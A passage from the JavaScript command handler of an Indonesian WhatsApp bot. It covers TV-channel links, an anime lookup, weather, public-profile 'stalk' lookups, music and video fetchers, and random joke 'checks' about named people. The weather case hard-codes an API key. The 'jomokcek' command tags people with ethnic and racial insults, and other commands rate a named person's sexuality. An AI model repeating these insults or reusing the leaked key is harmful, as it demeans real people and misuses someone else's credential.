alice.sendPoll(from, teksk, ['TVINTERNASIONAL','GLOBALTV','MNCTV','RCTI','TRANSTV','TRANS7','ANTV','SCTV','NET','INDOSIAR'])
}
break
case 'whatanime': {
  if (/image/.test(mime)) {
    alice.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key,
      }
    });
const media2 = await alice.downloadAndSaveMediaMessage(q)
const anu = await TelegraPh(media2)
    try {
      let api = `https://api.trace.moe/search?anilistInfo&url=${anu}`;
      let { data } = await axios.get(api);
      let anime = data.result[0].anilist;
      let episode = data.result[0].episode;
      let similarity = data.result[0].similarity;
      let at = new Date(data.result[0].from * 1000).toISOString().substr(11, 12) + ' - ' + new Date(data.result[0].to * 1000).toISOString().substr(11, 12);
      let malId = anime.idMal;
      let anilistId = anime.id;
      let titleRomaji = anime.title.romaji;
      let titleNative = anime.title.native;
      let caption = `• *Title:* ${titleRomaji} (${titleNative})
• *Episode:* ${episode}
• *Similarity:* ${(similarity * 100).toFixed(2)}%
• *At:* ${at}`;
      alice.sendMessage(m.chat, { image: { url: anu }, caption: caption },{quoted:fpayment2})
    } catch (e) {
      console.log(e);
       reply(' Error!')
    }
  } else {
    reply('Please reply to the image')
  }
}
break
//Channel-nya
case "tvinternasional":
{
let teksb = `📺SALURAN TELEVISI GELOMBANG DUNIA📺`
let channel = `https://photocall.tv/`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "globaltv": case "gtv":
{

let teksz = `📺SALURAN TELEVISI GLOBAL TV📺`
let channel = `https://m.rctiplus.com/tv/globaltv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksz}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksz,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: true
}
}}, {quoted: m})
}
break
case "rcti":
{



let teksy = `📺SALURAN TELEVISI RCTI📺`
let channel = `https://m.rctiplus.com/tv/rcti`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksy}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksy,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "mnctv":
{
let teksuu = `📺SALURAN TELEVISI MNCTV📺`
let channel = `https://m.rctiplus.com/tv/mnctv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksuu}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksuu,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "transtv":
{

let teksbn = `📺SALURAN TELEVISI TRANS TV📺`
let channel = `https://www.transtv.co.id/live`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksbn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksbn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break

case "trans7":
{

let tekshb = `📺SALURAN TELEVISI TRANS 7📺`
let channel = `https://www.transtv.co.id/live/trans7`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${tekshb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "antv":
{
let tekshbb = `📺SALURAN TELEVISI ANTV📺`
let channel = `https://m.vidio.com/live/782-antv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${tekshbb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshbb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "sctv":
{

let teksknn = `📺SALURAN TELEVISI SCTV📺`
let channel = `https://m.vidio.com/live/204`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksknn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksknn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "nettv": case "net":
{
let teksim = `📺SALURAN TELEVISI NET TV📺`
let channel = `https://www.netmedia.co.id/live-streaming`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${teksim}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksim,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "indosiar":
{

let tekskop = `📺SALURAN TELEVISI INDOSIAR📺`
let channel = `https://m.vidio.com/live/205`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

alice.sendMessage(m.chat, {text: `${tekskop}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekskop,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
reply795(eb)
}
break
case 'dbinary': {
if (!m.quoted) return reply(`reply code *binary* dengan caption ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(m.quoted.text)
reply795('*Result :* '+db)
}
break
case 'cekcuaca': case 'weather':{
if (!text) return reply('lokasinya dimana?')
let wdata = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
);
let textw = ""
textw += `*🗺️Weather of  ${text}*\n\n`
textw += `*Weather :* ${wdata.data.weather[0].main}\n`
textw += `*Description :* ${wdata.data.weather[0].description}\n`
textw += `*Avg Temp :* ${wdata.data.main.temp}\n`
textw += `*Feels Like :* ${wdata.data.main.feels_like}\n`
textw += `*Pressure :* ${wdata.data.main.pressure}\n`
textw += `*Humidity :* ${wdata.data.main.humidity}\n`
textw += `*Humidity :* ${wdata.data.wind.speed}\n`
textw += `*Latitude :* ${wdata.data.coord.lat}\n`
textw += `*Longitude :* ${wdata.data.coord.lon}\n`
textw += `*Country :* ${wdata.data.sys.country}\n`

alice.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: `${wdata.data.coord.lat}`,
degreesLongitude: `${wdata.data.coord.lon}`,
name: text,
url: "https://foursquare.com/v/520dceb911d2dac1f713434a",
caption: textw,
sequenceNumber: 1709322015967001, timeOffset: Date.now(), jpegThumbnail: ppnyauser,
}
}, { quoted: fkontak2 })
}
break

case 'tiktokstalk': {
	  if (!text) return reply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
 • *Number:* ${res.name}
 • *Username:* ${res.username}
 • *followers:* ${res.followers}
 • *following:* ${res.following}
 • *Desc:* ${res.desc}

 • *Link* : https://tiktok.com/${res.username}
└────────────`
  await alice.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'igstalk': {
if (!args[0]) return reply795(`Enter Instagram Username\n\nExample : ${prefix + command} bg.dalwin`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
 • *Name :* ${res.name} 
 • *Username :* ${res.username}
 • *Follower :* ${res.followersH}
 • *Following :* ${res.followingH}
 • *Bio :* ${res.description}
 • *Posts :* ${res.postsH}
 • *Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await alice.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        reply(`lihat username yang valid di *Instagram*`)
      }
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return reply(`Example ${prefix+command} Darwin`)
let githubstalk = require('./lib/sekref')
aj = await githubstalk.githubstalk(`${q}`)
alice.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*GITHUB STALK*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} hercai`)
let npmstalk = require('./lib/sekref')
eha = await npmstalk.npmstalk(q)
reply795(`*NPM STALK*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Publish Time : ${eha.publishTime}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'distance': case 'jarak':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
reply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return reply(`• Example : ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return alice.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else reply795(data.desc)
}
break
case 'spotify':
if (!text) return reply('Masukan judul lagu!') 
let searching = require('./lib/spotify')
searching(text).then(result => {
const hasil = `乂 *S P O T I F Y*

*Title*: ${result.data[0].title}
*Duration*: ${result.data[0].duration}
*Popular*: ${result.data[0].popularity}
*Url*: ${result.data[0].url}
`
alice.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'Alice Spotify',
"body": `${result.data[0].url}`,
"showAdAttribution": false,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
"renderLargerThumbnail": true

}
}}, {quoted: floc})
					
const spoDl = `https://spotifyku.my.id/download?url=${result.data[0].url}`
alice.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `Alice Spotify`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
sourceUrl: `${global.saluran}`,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
   })
break 
case 'spotifysearch':{
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
  
let spotify = await fetch(`https://api.nomisec07.site/api/spotify-search?text=${text}`);
  let json = await spotify.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Popularitas:* ${v.popularity}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
  
let vid = 'https://telegra.ph/file/1777e972a6ea790afebfc.mp4'
alice.sendFile(m.chat, vid, 'pp.mp4', hasil, m, true, { 
 gifPlayback: true, gifAttribution: 2})
}
break;
case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
let krt = await scp2.ssweb(q)
alice.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'ghstalk':
if (!text) return reply('Harap Masukan Username')
reply('Searching...')
    let nya = await fetch(`https://api.github.com/users/${text}`).then(a => a.json())
    let thumb = await getBuffer(nya.avatar_url)
    let hasil = `*── 「 GITHUB STALK 」 ──*
➸ *Bio*: ${nya.bio}
➸ *Perusahaan*: ${nya.company}
➸ *Repo Publik:* ${nya.public_repos}
➸ *Gists Publik:* ${nya.public_gists}
➸ *Follower:* ${nya.followers}
➸ *Following:* ${nya.following}
➸ *Lokasi:* ${nya.location}
➸ *Link:* ${nya.html_url}
`
alice.sendMessage(m.chat, { image: thumb, caption: hasil, quoted: m })
break
case 'openai': case 'chatgpt': case 'ai':{
if (!text) return reply('Enter questions!')
const { askGPT, GptGo } = require('./lib/gpt_bot');
const chats = await askGPT(text);    
reply795('`'+chats.result+'`')
}
break
case 'bing-img': case 'bingimg':
case 'bingimage':{
if (!text) return reply(`Example: .${command} highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed`)
let anu = `https://aemt.me/bingimg?text=${text}`
await alice.sendMessage(m.chat, {image: {url:anu}, caption: `*< Success >*\n\n*Prompt :* ${text}`},{quoted: fpayment2})
}
break //Powered By alice & Darwin
case 'textimg': case 'txt2img':{
if (!text) return reply('Example: .txt2img highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed')
let anu = `https://aemt.me/ai/text2img?text=${text}`
await alice.sendMessage(m.chat, {image: {url:anu}, caption: `*< Success >*\n\n*Prompt :* ${text}`},{quoted: fpayment2})
}
break //Powered By alice & Darwin
case 'stalktiktok':
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
alice.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\nResult From '+text+'\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
}
alice.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
case 'getmusic': {
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
downloadMp3(urls[text - 1])
}
break
case 'getvideo': 
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
const alicevidoh2 = require('./lib/ytdl2')
let quality = args[1] ? args[1] : '360p'
const vid2=await alicevidoh2.mp4(urls[text - 1], quality)
const ytc2=`*Tittle:* ${vid2.title}
*Date:* ${vid2.date}
*Duration:* ${vid2.duration}
*Quality:* ${vid2.quality}`
await alice.sendMessage(m.chat,{
    video: {url:vid2.videoUrl},
    caption: ytc2
},)
break
case "ytreels": case "youtubereels":{
if (!text) return m.reply('Masukan Link Nya!!!')
downloadMp4(text)
}
break
case 'pinterest': case 'pin':
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query -jumlah\nContoh :\n${command} cecan atau ${command} cecan -10`)
reply('_Tunggu sebentar..._')
var jumlah;
if (q.includes('-')) jumlah = q.split('-')[1]
pinterest(q.replace('-'+jumlah, '')).then(async(data) => {
if (q.includes('-')) {
if (data.result.length < jumlah) {
  jumlah = data.result.length
  reply(`Result ${data.result.length} gambar, gambar segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
  alice.sendMessage(from, { image: { url: data.result[i] }, caption: `_Hasil pencarian ${q}_`})
}

} else { 
alice.sendMessage(from, { caption: `Ini dia ${q}`, image: { url: pickRandom(data.result) }}, { quoted: m })

}
})
break
case 'metaai':
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `Powered By Darwin`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Alice;Bot;;;\nFN:Alice Bot\nTEL;type=Mobile;waid=13135550002:+62 838-9738-7848\nEND:VCARD",
}
}), { userJid: m.chat, quoted: fpayment2 })
alice.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break










































// FITUR PRIMBON
case 'apakah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break
case 'rate': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'jomokcek': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break

//menu primbon
case 'artimimpi': case 'tafsirmimpi': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} yunzhie, 7, 7, 2024, darwin, 16, 11, 2024`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Darwin`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Aruna, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Darwin|YunYun`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 alice.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
